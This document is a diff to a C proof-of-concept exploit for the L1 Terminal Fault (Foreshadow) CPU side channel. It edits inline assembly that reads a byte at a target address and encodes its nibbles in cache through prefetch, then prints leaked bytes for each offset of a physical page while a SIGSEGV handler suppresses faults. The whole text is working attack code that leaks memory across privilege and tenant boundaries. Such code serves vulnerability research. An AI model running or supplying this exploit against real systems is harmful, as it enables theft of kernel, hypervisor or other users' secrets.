@@ -56,14 +56,14 @@ uint8_t l1tf(void *leak_addr, reload_buffer_t reload_buffer, size_t threshold) {
 
   asm volatile("xor %%rax, %%rax\n"
                "xor %%rbx, %%rbx\n"
-               "movb (%[leak_addr]), %%al\n"
-               "movb %%al, %%bl\n"
-               "and $0xf0, %%al\n"
-               "and $0x0f, %%bl\n"
-               "shl $0x8, %%eax\n"
-               "shl $0xc, %%ebx\n"
-               "prefetcht0 (%[nibble1], %%rbx)\n"
-               "prefetcht0 (%[nibble0], %%rax)\n"
+               "movq (%[leak_addr]), %%rax\n"
+               "movq %%rax, %%rbx\n"
+               "and $0xf0, %%rax\n"
+               "and $0x0f, %%rbx\n"
+               "shl $0x8, %%rax\n"
+               "shl $0xc, %%rbx\n"
+               "prefetcht0 (%[nibble1], %%rax)\n"
+               "prefetcht0 (%[nibble0], %%rbx)\n"
                "mfence\n"
                "loop:\n"
                "pause\n"
@@ -72,7 +72,7 @@ uint8_t l1tf(void *leak_addr, reload_buffer_t reload_buffer, size_t threshold) {
                "reload_label:"
 
                ::[leak_addr] "r"(leak_addr),
-               [nibble0] "r"(reload_buffer[1]), [nibble1] "r"(reload_buffer[0])
+               [nibble0] "r"(reload_buffer[0]), [nibble1] "r"(reload_buffer[1])
                : "rax", "rbx");
 
   reload(AMOUNT_OF_RELOAD_PAGES, PAGE_SIZE, (void *)reload_buffer, raw_results,
@@ -144,17 +144,15 @@ int main(int argc, char *argv[argc]) {
   fprintf(stderr, "Clear the reload buffer at %p\n", reload_buffer);
   memset(reload_buffer, 0, sizeof(reload_buffer_t));
 
+  printf("Results physcial addr %lx:\n", phys_addr);
   size_t start = (phys_addr & 0xfff);
   for (size_t j = start; j < start + length; j += 1) {
-    size_t results[VALUES_IN_BYTE] = {0};
     void *leak_addr = (char *)leak + j;
-
-    printf("Results physcial addr %lx:\n", (pfn << 12) | j);
-    for (int i = 0; i < 10; ++i) {
-      uint8_t x = l1tf(leak_addr, *reload_buffer, threshold);
-      printf("0x%x\t%x\n", i, x);
-    }
+    uint8_t leaked_byte = l1tf(leak_addr, *reload_buffer, threshold);
+    printf("%x ", leaked_byte);
   }
+  printf("\n");
+
   // Restore the segfault handler back to normal
   sa.sa_handler = SIG_DFL;
   sigaction(SIGSEGV, &sa, NULL);
